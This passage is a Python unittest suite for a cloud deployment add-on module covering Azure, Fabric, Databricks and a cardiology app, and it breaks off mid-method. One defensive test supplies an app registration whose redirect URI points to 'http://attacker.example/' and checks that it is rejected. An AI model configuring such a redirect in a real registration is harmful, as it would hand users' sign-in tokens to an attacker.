from __future__ import annotations

import json
import os
from pathlib import Path
import sys
import time
import unittest
from unittest.mock import ANY, AsyncMock, Mock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from activities import addons


class AddonContractTests(unittest.TestCase):
    def config(self, **options):
        return {"expected_tenant_id": "11111111-1111-1111-1111-111111111111",
                "expected_subscription_id": "22222222-2222-2222-2222-222222222222",
                "fabric_workspace_name": "med-test", "location": "eastus2", "cardiology_location": "eastus2", **options}

    def test_cli_json_parser_ignores_informational_prefix(self):
        output = '[rayfin] using ambient token from RAYFIN_TOKEN\n{"deployment":{"hostingUrl":"https://app.example"}}\n'
        self.assertEqual(
            addons.parse_cli_json(output, "Rayfin status")["deployment"]["hostingUrl"],
            "https://app.example",
        )

    def test_cli_json_parser_rejects_output_without_an_object(self):
        with self.assertRaisesRegex(RuntimeError, "returned no JSON object"):
            addons.parse_cli_json("[rayfin] no status available\n", "Rayfin status")


    def test_explicit_model_requires_exact_version_and_fifty_free(self):
        config = self.config(deploy_cardiology=True, cardiology_chat_model="chosen", cardiology_chat_model_version="2026-07-09")
        def az(_config, *args):
            if args[0] == "provider":
                return {"registrationState": "Registered"}
            if args[1] == "model":
                return [{"model": {"name": "chosen", "version": "2026-07-09", "skus": [{"name": "DataZoneStandard"}]}}]
            return [{"name": {"value": "OpenAI.DataZoneStandard.chosen"}, "limit": 100, "currentValue": 50}]
        with patch.object(addons, "az_json", side_effect=az), patch.object(addons.Cloud, "call", return_value={"defaultUserRolePermissions": {"allowedToCreateApps": True}}):
            self.assertTrue(all(c["status"] == "pass" for c in addons.preflight(config)))
            config["cardiology_chat_model_version"] = "wrong-version"
            checks = addons.preflight(config)
            self.assertEqual(next(c for c in checks if c["name"] == "Cardiology model quota")["status"], "fail")


    def test_cardiology_quota_fallback_suggests_region_and_handles_registering_provider(self):
        config = self.config(deploy_cardiology=True, cardiology_location="eastus2")
        def az(_config, *args):
            if args[0] == "provider":
                return {"registrationState": "Registered"}
            region = args[-1]
            if args[1] == "model":
                return [{"model": {"name": "gpt-5.6-luna", "version": "2026-07-09", "skus": [{"name": "DataZoneStandard"}]}}]
            return [{"name": {"value": "OpenAI.DataZoneStandard.gpt-5.6-luna"}, "limit": 100 if region == "eastus" else 20, "currentValue": 0}]
        with patch.object(addons, "az_json", side_effect=az), patch.object(addons.Cloud, "call", return_value={"defaultUserRolePermissions": {"allowedToCreateApps": True}}):
            check = next(c for c in addons.preflight(config) if c["name"] == "Cardiology model quota")
            self.assertEqual(check["status"], "fail")
            self.assertEqual(check.get("suggestedRegion"), "eastus")
            self.assertIn("(available in eastus)", check["message"])

        with patch.object(addons, "ensure_providers_registered", return_value=[("Microsoft.CognitiveServices", "Registering")]), \
             patch.object(addons, "_check_cardiology_region_quota", side_effect=RuntimeError("MissingSubscriptionRegistration")), \
             patch.object(addons.Cloud, "call", return_value={"defaultUserRolePermissions": {"allowedToCreateApps": True}}):
            check = next(c for c in addons.preflight(config) if c["name"] == "Cardiology model quota")
            self.assertEqual(check["status"], "warn")
            self.assertIn("Microsoft.CognitiveServices is registering", check["message"])

    def test_ensure_providers_registered_raises_on_wait_timeout(self):
        config = self.config()
        with patch.object(addons, "az_json", return_value={"registrationState": "Registering"}), \
             patch.object(addons.subprocess, "run"), \
             patch.object(addons.time, "sleep"):
            with self.assertRaisesRegex(RuntimeError, "Timed out waiting for Azure resource providers.*Microsoft.Databricks"):
                addons.ensure_providers_registered(config, ["Microsoft.Databricks"], wait=True, timeout_sec=0)
    def test_databricks_unregistered_provider_warns_and_auto_registers(self):
        config = self.config(deploy_databricks=True)
        provider = {"registrationState": "NotRegistered", "resourceTypes": [
            {"resourceType": "workspaces", "locations": ["East US 2"]}]}
        locations = {"value": [{"name": "eastus2", "displayName": "East US 2"}]}
        with patch.object(addons, "az_json", return_value=provider), \
             patch.object(addons, "ensure_providers_registered", return_value=[("Microsoft.Databricks", "Registering")]) as register_mock, \
             patch.object(addons.Cloud, "call", return_value=locations), \
             patch.object(addons.shutil, "which", return_value="/usr/bin/tool"):
            result = addons.preflight(config)[0]
            self.assertEqual(result["status"], "warn")
            self.assertIn("auto-registration started", result["message"])
            register_mock.assert_called_once_with(config, ["Microsoft.Databricks"], wait=False)
    def test_databricks_rejects_regions_not_offered_by_provider(self):
        config = self.config(deploy_databricks=True)
        provider = {"registrationState": "Registered", "resourceTypes": [
            {"resourceType": "workspaces", "locations": ["East US 2"]}]}
        locations = {"value": [{"name": "eastus2", "displayName": "East US 2"},
                               {"name": "westus2", "displayName": "West US 2"}]}
        with patch.object(addons, "az_json", return_value=provider), \
             patch.object(addons.Cloud, "call", return_value=locations), \
             patch.object(addons.shutil, "which", return_value="/usr/bin/tool"):
            self.assertEqual(addons.preflight(config)[0]["status"], "pass")
            config["location"] = "westus2"
            result = addons.preflight(config)[0]
            self.assertEqual(result["status"], "fail")
            self.assertIn("not offered in westus2", result["message"])


    def test_fabric_requests_are_attributed_and_tenant_pinned(self):
        cloud = addons.Cloud(self.config())
        cloud.tokens.tenant_id = self.config()["expected_tenant_id"]
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self): return json.dumps({"value": []}).encode()
        with patch.object(cloud.tokens, "token", return_value="not-a-real-token"), patch.object(addons.urllib.request, "urlopen", return_value=Response()) as opening:
            cloud.call("GET", addons.FABRIC + "/v1/workspaces", skill="spark-cli")
            request = opening.call_args.args[0]
            self.assertEqual(request.get_header("X-ms-fabric-skill"), "spark-cli")
            cloud.tokens.tenant_id = "different-tenant"
            with self.assertRaisesRegex(RuntimeError, "tenant differs"):
                cloud.call("GET", addons.FABRIC + "/v1/workspaces")
            self.assertEqual(opening.call_count, 1)
    def test_non_json_api_response_is_an_actionable_failure(self):
        cloud = addons.Cloud(self.config())
        cloud.tokens.tenant_id = self.config()["expected_tenant_id"]
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self): return b"<html>private login redirect content</html>"
        with patch.object(cloud.tokens, "token", return_value="not-a-real-token"), \
             patch.object(addons.urllib.request, "urlopen", return_value=Response()):
            with self.assertRaisesRegex(RuntimeError, "accounts.azuredatabricks.net returned a non-JSON API response") as error:
                cloud.call("GET", "https://accounts.azuredatabricks.net/api/2.0/accounts", addons.DATABRICKS)
        self.assertNotIn("private login", str(error.exception))

    def test_relative_fabric_continuation_stays_on_the_original_origin(self):
        cloud = object.__new__(addons.Cloud)
        cloud.call = Mock(side_effect=[
            {"value": [{"id": "first"}], "continuationUri": "/v1/workspaces?continuationToken=next"},
            {"value": [{"id": "second"}]},
        ])
        self.assertEqual(
            [item["id"] for item in cloud.items(addons.FABRIC + "/v1/workspaces")],
            ["first", "second"],
        )
        self.assertEqual(
            cloud.call.call_args_list[1].args[1],
            addons.FABRIC + "/v1/workspaces?continuationToken=next",
        )


    def test_selection_does_not_add_unrequested_services(self):
        self.assertEqual(addons.selected({"deploy_rayfin_apps": True}), ["rayfin"])
        self.assertEqual(addons.selected({}), [])
        self.assertEqual(addons.selected({
            "deploy_databricks": True,
            "deploy_rayfin_apps": True,
            "deploy_cardiology": True,
        }), ["cardiology", "rayfin", "databricks"])


class FreshDatabricksExportTests(unittest.IsolatedAsyncioTestCase):
    async def test_fresh_export_does_not_run_when_snapshot_cleanup_fails(self):
        runner = object.__new__(addons.AddonRunner)
        runner.config = {"resource_group_name": "rg", "expected_subscription_id": "subscription"}
        runner.env = {}
        runner.working_copy = Mock(return_value=Path("unused"))
        runner.resource = Mock(return_value={"id": "fhir-id"})
        exported = False
        async def step(title, *_args, **_kwargs):
            nonlocal exported
            if title == "Empty previous Databricks export":
                raise RuntimeError("Snapshot directory deletion denied")
            exported = True
        runner.ps = AsyncMock(side_effect=step)
        with patch.object(addons, "az_json", return_value={"properties": {"exportConfiguration": {"storageAccountName": "exports"}}}), \
             patch.object(addons, "ensure_providers_registered", return_value=[]), \
             patch.dict(sys.modules, {"yaml": Mock()}):
            with self.assertRaisesRegex(RuntimeError, "Snapshot directory deletion denied"):
                await runner.databricks(fresh_export=True)
        self.assertFalse(exported, "An export must not mix new files into a snapshot that failed cleanup")

    async def test_disabled_automatic_identity_management_is_an_actionable_failure(self):
        runner = object.__new__(addons.AddonRunner)
        runner.command = AsyncMock(side_effect=RuntimeError(
            "Provision Entra group g: Error: Automatic Identity Management is not enabled for account 1."))
        with self.assertRaisesRegex(RuntimeError, "Automatic Identity Management is off .* base deployment is unaffected"):
            await runner.ensure_admin_group({}, Path("unused"), "object-id", "g")
        runner.command.assert_awaited_once()
        self.assertEqual(runner.command.await_args.args[1][:3], ["databricks", "workspace-iam-v2", "resolve-group-proxy"])

    async def test_other_group_provisioning_errors_are_not_rewritten(self):
        runner = object.__new__(addons.AddonRunner)
        runner.command = AsyncMock(side_effect=RuntimeError("Provision Entra group g: permission denied"))
        with self.assertRaisesRegex(RuntimeError, "permission denied"):
            await runner.ensure_admin_group({}, Path("unused"), "object-id", "g")

    async def test_alert_recipient_that_is_not_a_workspace_user_is_dropped_not_passed_to_the_bundle(self):
        runner = object.__new__(addons.AddonRunner)
        runner.log = Mock()
        runner.command = AsyncMock(return_value="[]")
        self.assertEqual(await runner.databricks_alert_recipient({}, Path("unused"), "alerts@example.com"), "")
        runner.log.assert_called_once()
        self.assertIn('userName eq "alerts@example.com"', runner.command.await_args.args[1])

    async def test_alert_recipient_that_is_a_workspace_user_is_kept(self):
        runner = object.__new__(addons.AddonRunner)
        runner.log = Mock()
        runner.command = AsyncMock(return_value='[{"userName": "joey@example.com"}]')
        self.assertEqual(await runner.databricks_alert_recipient({}, Path("unused"), "joey@example.com"), "joey@example.com")

    async def test_empty_alert_recipient_makes_no_lookup(self):
        runner = object.__new__(addons.AddonRunner)
        runner.command = AsyncMock()
        self.assertEqual(await runner.databricks_alert_recipient({}, Path("unused"), ""), "")
        runner.command.assert_not_awaited()

    async def test_new_databricks_workspace_is_assigned_without_the_optional_azure_cli_extension(self):
        runner = object.__new__(addons.AddonRunner)
        runner.config = {"resource_group_name": "rg", "expected_subscription_id": "subscription", "location": "westus2"}
        runner.azure = []
        runner.command = AsyncMock(side_effect=[
            RuntimeError("No metastore assigned"),
            '[{"metastore_id":"metastore","region":"westus2"}]',
            "",
            '{"metastore_id":"metastore"}',
        ])

        def az(_config, *args):
            if args[:2] == ("resource", "list"):
                return [{"id": "/subscriptions/subscription/resourceGroups/rg/providers/Microsoft.Databricks/workspaces/new"}]
            if args[:2] == ("resource", "show"):
                return {"properties": {"workspaceId": "7405609633265528"}}
            raise AssertionError(args)

        with patch.object(addons, "az_json", side_effect=az):
            await runner.ensure_metastore({}, Path("unused"))

        assignment = runner.command.await_args_list[2].args[1]
        self.assertEqual(assignment[:5], ["databricks", "metastores", "assign", "7405609633265528", "metastore"])

    async def test_a_failing_addon_does_not_prevent_the_others_from_running(self):
        runner = object.__new__(addons.AddonRunner)
        runner.deployment = {"customStatus": {}, "output": {"phases": [], "resources": {}}}
        runner.discover, runner.persist, runner.log = AsyncMock(), Mock(), Mock()
        ran = []
        async def databricks(fresh_export=False): raise RuntimeError("bundle invalid")
        async def rayfin(fresh_export=False): ran.append("rayfin"); return {"ok": 1}
        async def cardiology(fresh_export=False): ran.append("cardiology"); return {"ok": 2}
        runner.databricks, runner.rayfin, runner.cardiology = databricks, rayfin, cardiology
        with self.assertRaisesRegex(RuntimeError, "databricks: bundle invalid"):
            await runner.run(["databricks", "rayfin", "cardiology"])
        self.assertEqual(ran, ["rayfin", "cardiology"])
        states = {k: v["status"] for k, v in runner.deployment["customStatus"]["addons"].items()}
        self.assertEqual(states, {"databricks": "failed", "rayfin": "succeeded", "cardiology": "succeeded"})

    async def test_cardiology_base_eventstream_is_resumed_before_use(self):
        runner = object.__new__(addons.AddonRunner)
        runner.ws = "workspace"
        runner.items = [{"type": "Eventstream", "displayName": "MasimoTelemetryStream", "id": "stream"}]
        runner.substep = Mock()
        runner.cloud = Mock()
        runner.cloud.call = Mock(side_effect=[
            {"sources": [{"name": "source", "status": "Paused"}],
             "destinations": [{"name": "destination", "status": "Paused"}]},
            {},
            {"sources": [{"name": "source", "status": "Resuming"}],
             "destinations": [{"name": "destination", "status": "Running"}]},
            {"sources": [{"name": "source", "status": "Running"}],
             "destinations": [{"name": "destination", "status": "Running"}]},
        ])

        with patch.object(addons.asyncio, "sleep", new=AsyncMock()) as sleep:
            await runner.ensure_eventstream_running("MasimoTelemetryStream")

        resume = runner.cloud.call.call_args_list[1].args
        self.assertEqual(resume[:5], (
            "POST",
            addons.FABRIC + "/v1/workspaces/workspace/eventstreams/stream/resume",
            addons.FABRIC,
            {"startType": "WhenLastStopped"},
            "eventstream-cli",
        ))
        sleep.assert_awaited_once_with(10)
        runner.substep.assert_any_call("Resume MasimoTelemetryStream", "succeeded")

    def cardiology_runner(self, tmp, with_rayfin=True, customStatus=None):
        wardflow = Path(tmp) / "wardflow"
        (wardflow / "caldova-cardio/hds-backend").mkdir(parents=True)
        if with_rayfin:
            (wardflow / "caldova-cardio/app/rayfin").mkdir(parents=True)
            (wardflow / "caldova-cardio/app/rayfin/rayfin.yml").write_text("id: caldova-cardiology-app\n")
        runner = object.__new__(addons.AddonRunner)
        runner.ws, runner.env, runner.items = "ws", {}, []
        runner.config = {"fabric_workspace_name": "med-test", "expected_tenant_id": "tenant", "expected_subscription_id": "sub",
                         "resource_group_name": "rg-med-test", "cardiology_location": "eastus2", "cardiology_prefix": "cardiotest",
                         "cardiology_app_users": ["user@example.com"], "cardiology_reviewer_users": [],
                         "cardiology_chat_model": "chosen", "cardiology_chat_model_version": "2026-07-09"}
        runner.deployment = {"customStatus": customStatus or {}, "output": {}}
        runner.substep, runner.log, runner.persist = Mock(), Mock(), Mock()
        runner.ensure_eventstream_running = AsyncMock()
        runner.gold = AsyncMock(return_value=({"displayName": "Gold"}, {"id": "sql", "connectionString": "sql.fabric"}))
        runner.resource = Mock(return_value={"id": "fhir", "name": "acr"})
        runner.item = Mock(return_value={"id": "item"})
        runner.cloud = Mock()
        runner.cloud.call = Mock(return_value={"properties": {"queryServiceUri": "https://kql"}})
        runner.command, runner.ps = AsyncMock(), AsyncMock()
        runner.cardiology_rayfin = AsyncMock(return_value="https://cardio-westus2.webapp.fabricapps.net/")

        def az_json(_config, *args):
            if args[:2] == ("resource", "show"):
                return {"properties": {"authenticationConfiguration": {"audience": "https://ws-fhir.fhir.azurehealthcareapis.com"}}}
            if args[:2] == ("containerapp", "list"):
                return []
            if args[:2] == ("containerapp", "show"):
                return {"properties": {"configuration": {"ingress": {"fqdn": "cardiotest-app.example.io"}}}}
            raise AssertionError(args)
        return runner, wardflow, az_json

    async def run_cardiology(self, runner, wardflow, az_json):
        with patch.dict(addons.os.environ, {"WARDFLOW_ROOT": str(wardflow)}), \
             patch.object(addons, "ensure_providers_registered"), \
             patch.object(addons, "az_json", side_effect=az_json), \
             patch.object(addons, "az", return_value="") as az:
            return await runner.cardiology(), az

    async def test_cardiology_registers_a_new_rayfin_origin_then_records_the_companion_url(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            runner, wardflow, az_json = self.cardiology_runner(tmp)
            result, az = await self.run_cardiology(runner, wardflow, az_json)
        origin = "https://cardio-westus2.webapp.fabricapps.net"
        cardio = [c for c in runner.ps.await_args_list if str(c.args[1]).endswith("deploy-cardiology-app.ps1")]
        self.assertEqual([c.args[0] for c in cardio], ["Deploy cardiology app", "Register cardiology Rayfin origin"])
        self.assertNotIn("CardiologyRayfinOrigins", cardio[0].args[2])
        self.assertEqual(cardio[1].args[2]["CardiologyRayfinOrigins"], [origin])
        runner.cardiology_rayfin.assert_awaited_once_with(wardflow / "caldova-cardio/app", ANY, "https://cardiotest-app.example.io")
        az.assert_called_once_with(runner.config, "containerapp", "update", "-g", "rg-med-test-cardio", "-n", "cardiotest-app",
                                   "--set-env-vars", "CALDOVA_RAYFIN_APP_URL=https://cardio-westus2.webapp.fabricapps.net/")
        self.assertEqual(result["rayfinUrl"], "https://cardio-westus2.webapp.fabricapps.net/")

    async def test_cardiology_rerun_after_a_failed_registration_or_env_update_passes_the_origin_back(self):
        # Phase 8 refuses a registration with SPA redirect URIs it was not given, so an origin
        # registered by a run that then failed must reach the next run's first phase-8 deploy.
        import tempfile
        origin = "https://cardio-westus2.webapp.fabricapps.net"
        for failing in ("registration", "env update"):
            with self.subTest(failing=failing), tempfile.TemporaryDirectory() as tmp:
                runner, wardflow, az_json = self.cardiology_runner(tmp)
                if failing == "registration":
                    async def fail_registration(title, *_args, **_kwargs):
                        if title == "Register cardiology Rayfin origin":
                            raise RuntimeError("live sign-in probe failed")
                    runner.ps.side_effect = fail_registration
                    with self.assertRaisesRegex(RuntimeError, "probe failed"):
                        await self.run_cardiology(runner, wardflow, az_json)
                else:
                    with patch.dict(addons.os.environ, {"WARDFLOW_ROOT": str(wardflow)}), \
                         patch.object(addons, "ensure_providers_registered"), \
                         patch.object(addons, "az_json", side_effect=az_json), \
                         patch.object(addons, "az", side_effect=RuntimeError("ARM 503")), \
                         self.assertRaisesRegex(RuntimeError, "ARM 503"):
                        await runner.cardiology()
                runner.ps.reset_mock(side_effect=True)
                await self.run_cardiology(runner, wardflow, az_json)
                cardio = [c for c in runner.ps.await_args_list if str(c.args[1]).endswith("deploy-cardiology-app.ps1")]
                self.assertEqual(cardio[0].args[2]["CardiologyRayfinOrigins"], [origin])
                self.assertEqual(len(cardio), 1, "an already-recorded origin needs no second phase-8 deploy")

    async def test_cardiology_rerun_keeps_the_recorded_rayfin_origin_without_a_second_phase_8_deploy(self):
        import tempfile
        status = {"addons": {"cardiology": {"resources": {"rayfinUrl": "https://Cardio-westus2.webapp.fabricapps.net/"}}}}
        with tempfile.TemporaryDirectory() as tmp:
            runner, wardflow, az_json = self.cardiology_runner(tmp, customStatus=status)
            await self.run_cardiology(runner, wardflow, az_json)
        cardio = [c for c in runner.ps.await_args_list if str(c.args[1]).endswith("deploy-cardiology-app.ps1")]
        self.assertEqual(len(cardio), 1)
        self.assertEqual(cardio[0].args[2]["CardiologyRayfinOrigins"], ["https://cardio-westus2.webapp.fabricapps.net"])

    async def test_cardiology_new_instance_reuses_the_existing_hosted_companion(self):
        import tempfile
        origin = "https://cardio-westus2.webapp.fabricapps.net"
        for origin_source in ("CALDOVA_RAYFIN_APP_URL", "CALDOVA_ALLOWED_ORIGIN", "registration"):
            with self.subTest(origin_source=origin_source), tempfile.TemporaryDirectory() as tmp:
                runner, wardflow, default_az_json = self.cardiology_runner(tmp)

                def live_az_json(config, *args):
                    if args[:2] == ("containerapp", "list"):
                        env = [{"name": "CALDOVA_AUTH_CLIENT_ID", "value": "client-id"}]
                        if origin_source != "registration":
                            env.append({"name": origin_source, "value": origin + "/"})
                        return [{"name": "cardiotest-app", "resourceGroup": "rg-med-test-cardio", "properties": {
                            "configuration": {"ingress": {"fqdn": "cardiotest-app.example.io"}},
                            "template": {"containers": [{"env": env}]}
                        }}]
                    if args[:3] == ("ad", "app", "show"):
                        return {"signInAudience": "AzureADMyOrg", "tags": ["hls-cardiology-app:sub/rg-med-test-cardio/cardiotest-app"],
                                "web": {"redirectUris": ["https://cardiotest-app.example.io/.auth/login/aad/callback"]},
                                "spa": {"redirectUris": [origin + "/"]}}
                    return default_az_json(config, *args)

                async def phase8(title, _script, params):
                    if title == "Deploy cardiology app" and params.get("CardiologyRayfinOrigins") != [origin]:
                        raise RuntimeError("foreign SPA redirect URI; existing app quarantined")

                runner.ps.side_effect = phase8
                result, _ = await self.run_cardiology(runner, wardflow, live_az_json)
                self.assertEqual(result["rayfinUrl"], origin + "/")
                self.assertEqual(runner.deployment["customStatus"]["addons"]["cardiology"]["resources"], result)

    async def test_cardiology_rejects_untrusted_registration_before_reconciliation(self):
        import tempfile
        for field, rejected in (("tags", []), ("signInAudience", "AzureADMultipleOrgs"),
                                ("web", {"redirectUris": ["https://other.example/.auth/login/aad/callback"]}),
                                ("spa", {"redirectUris": ["http://attacker.example/"]})):
            with self.subTest(field=field), tempfile.TemporaryDirectory() as tmp:
                runner, wardflow, default_az_json = self.cardiology_runner(tmp)

                def live_az_json(config, *args):
                    if args[:2] == ("containerapp", "list"):
                        return [{"name": "cardiotest-app", "resourceGroup": "rg-med-test-cardio", "properties": {
                            "configuration": {"ingress": {"fqdn": "cardiotest-app.example.io"}},
                            "template": {"containers": [{"env": [{"name": "CALDOVA_AUTH_CLIENT_ID", "value": "client-id"}]}]}
                        }}]
                    if args[:3] == ("ad", "app", "show"):
                        registration = {"signInAudience": "AzureADMyOrg", "tags": ["hls-cardiology-app:sub/rg-med-test-cardio/cardiotest-app"],
                                        "web": {"redirectUris": ["https://cardiotest-app.example.io/.auth/login/aad/callback"]},
                                        "spa": {"redirectUris": ["https://cardio-westus2.webapp.fabricapps.net/"]}}
                        registration[field] = rejected
                        return registration
                    return default_az_json(config, *args)

                with self.assertRaises((RuntimeError, ValueError)):
                    await self.run_cardiology(runner, wardflow, live_az_json)
                self.assertFalse(any(call.args[0] == "Deploy cardiology app" for call in runner.ps.call_args_list))

    async def test_cardiology_without_a_rayfin_project_deploys_only_the_container_app(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            runner, wardflow, az_json = self.cardiology_runner(tmp, with_rayfin=False)
            result, az = await self.run_cardiology(runner, wardflow, az_json)
        runner.cardiology_rayfin.assert_not_awaited()
        az.assert_not_called()
        self.assertNotIn("rayfinUrl", result)

    async def test_cardiology_rayfin_failure_fails_the_addon(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            runner, wardflow, az_json = self.cardiology_runner(tmp)
            runner.cardiology_rayfin.side_effect = RuntimeError("cardiology-rayfin: deploy static failed")
            with self.assertRaisesRegex(RuntimeError, "deploy static failed"):
                await self.run_cardiology(runner, wardflow, az_json)

    def rayfin_runner(self, tmp):
        source = Path(tmp) / "app"
        (source / "rayfin").mkdir(parents=True)
        (source / "rayfin/rayfin.yml").write_text("id: caldova-cardiology-app\nservices:\n  auth:\n    enabled: true\n    allowedRedirectUris: []\n")
        runner = object.__new__(addons.AddonRunner)
        runner.work = Path(tmp) / "work"
        runner.work.mkdir()
        runner.ws, runner.env = "ws", {}
        runner.config = {"expected_tenant_id": "tenant"}
        runner.cloud = Mock()
        runner.cloud.tokens.token = Mock(return_value="fabric-token")
        runner.rayfin_command = AsyncMock()
        runner.command = AsyncMock(side_effect=["", 'info\n{"deployment":{"hostingUrl":"https://cardio-westus2.webapp.fabricapps.net/"}}'])
        return runner, source

    def app(self, client_id):
        return {"properties": {"template": {"containers": [{"env": [{"name": "CALDOVA_AUTH_CLIENT_ID", "value": client_id}]}]}}}

    async def test_cardiology_rayfin_builds_with_bearer_config_and_registers_its_hosting_origin(self):
        import tempfile, yaml
        client = "0f9b5c1e-1111-4222-8333-944455556666"
        with tempfile.TemporaryDirectory() as tmp:
            runner, source = self.rayfin_runner(tmp)
            hosting = await runner.cardiology_rayfin(source, self.app(client), "https://cardiotest-app.example.io")
            config = yaml.safe_load((runner.work / "caldova-cardio-rayfin/rayfin/rayfin.yml").read_text())
        self.assertEqual(hosting, "https://cardio-westus2.webapp.fabricapps.net/")
        calls = runner.rayfin_command.await_args_list
        self.assertEqual([c.args[0] for c in calls], ["cardiology-rayfin: provision", "cardiology-rayfin: deploy static",
                                                      "cardiology-rayfin: register hosting origin"])
        for call in (calls[0], calls[2]):
            self.assertEqual(call.args[1][-2:], ["--exclude-services", "staticHosting,functions"])
            self.assertNotIn("NEXT_PUBLIC_PLATFORM_URL", call.args[3])
        self.assertNotIn("--exclude-services", calls[1].args[1])
        self.assertEqual({k: v for k, v in calls[1].args[3].items() if k.startswith("NEXT_PUBLIC_")}, {
            "NEXT_PUBLIC_PLATFORM_URL": "https://cardiotest-app.example.io",
            "NEXT_PUBLIC_CALDOVA_AUTH_CLIENT_ID": client, "NEXT_PUBLIC_CALDOVA_AUTH_TENANT_ID": "tenant"})
        self.assertEqual(calls[1].args[3]["RAYFIN_TOKEN"], "fabric-token")
        self.assertEqual(runner.command.await_args_list[0].args[1][-1], "@microsoft/rayfin-cli@1.36.2")
        self.assertEqual(config["services"]["auth"]["allowedRedirectUris"], ["https://cardio-westus2.webapp.fabricapps.net"])

    async def test_cardiology_rayfin_refuses_to_build_without_the_app_registration(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            runner, source = self.rayfin_runner(tmp)
            with self.assertRaisesRegex(RuntimeError, "CALDOVA_AUTH_CLIENT_ID"):
                await runner.cardiology_rayfin(source, self.app(""), "https://cardiotest-app.example.io")
        runner.command.assert_not_awaited()
        runner.rayfin_command.assert_not_awaited()

    def test_rayfin_origin_strips_paths_and_rejects_non_https(self):
        self.assertEqual(addons.rayfin_origin("https://A-westus2.webapp.fabricapps.net/x?y"), "https://a-westus2.webapp.fabricapps.net")
        with self.assertRaises(RuntimeError):
            addons.rayfin_origin("http://a-westus2.webapp.fabricapps.net")

    async def test_cancelling_the_deployment_stops_remaining_addons(self):
        runner = object.__new__(addons.AddonRunner)
        runner.deployment = {"customStatus": {}, "output": {"phases": [], "resources": {}}, "runtimeStatus": "Terminated"}
        runner.discover, runner.persist, runner.log = AsyncMock(), Mock(), Mock()
        async def databricks(fresh_export=False): raise RuntimeError("Add-on cancelled")
        runner.databricks, runner.rayfin = databricks, AsyncMock()
        with self.assertRaisesRegex(RuntimeError, "cancelled"):
            await runner.run(["databricks", "rayfin"])
        runner.rayfin.assert_not_awaited()

    async def test_rayfin_imaging_uses_internal_cache_only_when_hosted_and_falls_back_to_on_the_fly_pipeline(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            root = tmp_path / "rayfin-imaging"
            (root / "pipeline/volumes").mkdir(parents=True)
            (root / "scripts").mkdir(parents=True)
            (root / ".venv/bin").mkdir(parents=True)
            (root / ".venv/bin/python").write_text("#!/bin/sh\n")
            cache_root = tmp_path / "data-share/rayfin-imaging-cache"
            (cache_root / "lakehouse").mkdir(parents=True)
            (cache_root / "volumes").mkdir(parents=True)
            (cache_root / "lakehouse/manifest.json").write_text('{"slides":[{"id":"brain-gbm"}]}')
            (cache_root / "volumes/manifest.json").write_text('{"studies":[{"id":"fetal-face-atlas"}]}')

            runner = object.__new__(addons.AddonRunner)
            runner.config = {"fabric_workspace_name": "med-test"}
            runner.log = Mock()
            runner.resource = Mock(return_value={"name": "sttest"})

            # 1. Public / non-hosted mode: even if HLS_SHARED_DATA_DIR is set, must NOT use internal cache; must run on-the-fly download/build.
            runner.command = AsyncMock()
            with patch.dict(addons.os.environ, {"HLS_HOSTED": "0", "HLS_SHARED_DATA_DIR": str(tmp_path / "data-share")}, clear=False):
                await runner.prepare_rayfin_imaging(root)
            titles_public = [call.args[0] for call in runner.command.await_args_list]
            self.assertIn("rayfin-imaging: download slides", titles_public)
            self.assertIn("rayfin-imaging: generate Deep Zoom tiles", titles_public)
            self.assertIn("rayfin-imaging: download petct", titles_public)
            self.assertIn("rayfin-imaging: convert cohort DICOM studies to NIfTI", titles_public)

            # 2. Internal hosted mode with populated cache: copies cache into work/ and skips external downloads.
            runner.command = AsyncMock()
            with patch.dict(addons.os.environ, {"HLS_HOSTED": "1", "HLS_SHARED_DATA_DIR": str(tmp_path / "data-share")}, clear=False):
                await runner.prepare_rayfin_imaging(root)
            titles_hosted = [call.args[0] for call in runner.command.await_args_list]
            self.assertNotIn("rayfin-imaging: download slides", titles_hosted)
            self.assertNotIn("rayfin-imaging: download petct", titles_hosted)
            self.assertTrue((root / "work/lakehouse/manifest.json").is_file())
            self.assertIn("rayfin-imaging: convert cohort DICOM studies to NIfTI", titles_hosted)
            self.assertIn("rayfin-imaging: upload slides to OneLake", titles_hosted)
            self.assertIn("rayfin-imaging: register slides Delta table", titles_hosted)
            self.assertIn("rayfin-imaging: upload volumes to OneLake", titles_hosted)
            self.assertIn("rayfin-imaging: register volumes Delta table", titles_hosted)


    async def test_ensure_onelake_databricks_storage_provisions_item_and_grants_readwrite_role(self):
        runner = object.__new__(addons.AddonRunner)
        runner.ws = "f306e105-78fd-4b16-bfbe-2b556d493cb7"
        runner.log = Mock()
        runner.cloud = Mock()
        runner.cloud.items = Mock(side_effect=[
            [],
            [],
        ])
        runner.cloud.call = Mock(side_effect=[
            {},
            {"id": "328852ec-d574-4ce2-a0e4-c2bb44162933", "displayName": "hls_databricks_onelake_storage"},
            {},
        ])
        with patch.object(addons, "az_json", return_value={"identity": {"principalId": "2a408d45-6f8e-4cf7-84f2-9953e44e58e5"}}):
            url = await runner.ensure_onelake_databricks_storage(
                {"expected_tenant_id": "c77e97fc-1859-4575-8c8b-53d74bc35a63"},
                "/subscriptions/sub/resourceGroups/rg/providers/Microsoft.Databricks/accessConnectors/ac",
            )
        self.assertEqual(
            url,
            "abfss://f306e105-78fd-4b16-bfbe-2b556d493cb7@onelake.dfs.fabric.microsoft.com/328852ec-d574-4ce2-a0e4-c2bb44162933/Files/",
        )
        self.assertEqual(runner.cloud.call.call_count, 3)

class BundlePreparationTests(unittest.TestCase):
    def test_every_production_target_of_the_real_bundle_gets_a_user_root_path_and_no_service_principal(self):
        import yaml
        bundle = yaml.safe_load((addons.ROOT / "azure-databricks/implementation/bundle/databricks.yml").read_text())
        production = [n for n, t in bundle["targets"].items() if t.get("mode") == "production"]
        self.assertTrue(production, "the bundle must still have production targets for this test to mean anything")
        addons.prepare_bundle(bundle, "joey@example.com")
        for name, target in bundle["targets"].items():
            self.assertNotIn("run_as", target)
            expected = "/Workspace/Users/joey@example.com/.bundle/${bundle.name}/${bundle.target}"
            self.assertEqual(target.get("workspace", {}).get("root_path"), expected if name in production else None)


    def test_cardiology_default_prefix_never_exceeds_twelve_chars_and_databricks_exports_arm_tenant_id(self):
